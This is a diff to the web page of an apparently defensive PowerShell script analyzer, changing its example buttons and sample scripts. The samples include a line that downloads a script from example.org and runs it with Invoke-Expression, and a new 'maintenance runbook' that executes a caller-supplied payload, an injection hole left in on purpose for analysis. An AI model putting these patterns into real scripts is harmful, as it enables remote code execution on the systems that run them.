@@ -78,9 +78,9 @@
 
                         <div class="example-list">
                             <button type="button" class="example-btn" data-example="harmless">Harmless script</button>
-                            <button type="button" class="example-btn" data-example="encoded">Encoded content -> execution</button>
-                            <button type="button" class="example-btn" data-example="webrequest">Web request demo</button>
-                            <button type="button" class="example-btn" data-example="obfuscation">Obfuscation demo</button>
+                            <button type="button" class="example-btn" data-example="encoded">Encoded content</button>
+                            <button type="button" class="example-btn" data-example="webrequest">Web request</button>
+                            <button type="button" class="example-btn" data-example="untrusted">Untrusted input</button>
                              
                         </div>
 
@@ -135,17 +135,23 @@ function Invoke-NsgEncodedDemo {
 $payload = Invoke-RestMethod -Uri 'https://example.org/sample.ps1'
 Invoke-Expression $payload`,
 
-        obfuscation: `# Obfuscation-style demo
-$O0O0O0 = -join ([char[]](87,114,105,116,101))
-$lI1IlI = -join ([char[]](72,111,115,116))
+        untrusted: `# Automated maintenance runbook
+# Security demo: parameter-controlled dynamic execution
+# For static analysis only. Do not execute.
 
-$Il1O0I = -join ([char[]](78,111,83,104,101,108,108,71,97,109,101,115))
-$O1lI0O = -join ([char[]](100,101,109,111))
+param(
+    [Parameter(Mandatory = $true)]
+    [string]$Payload,
 
-$OIl1l0 = $O0O0O0 + [char]45 + $lI1IlI
-$lIl0O1 = $Il1O0I + [char]32 + $O1lI0O
+    [string]$ChangeId = 'CHG-2026-001'
+)
 
-& $OIl1l0 $lIl0O1`
+Write-Host "Starting maintenance task: $ChangeId"
+
+# Execute the maintenance instructions supplied by the caller
+Invoke-Expression $Payload
+
+Write-Host "Maintenance task completed."`
     };
 const button = document.getElementById("analyzeBtn");
 document.querySelectorAll(".example-btn").forEach((exampleButton) => {
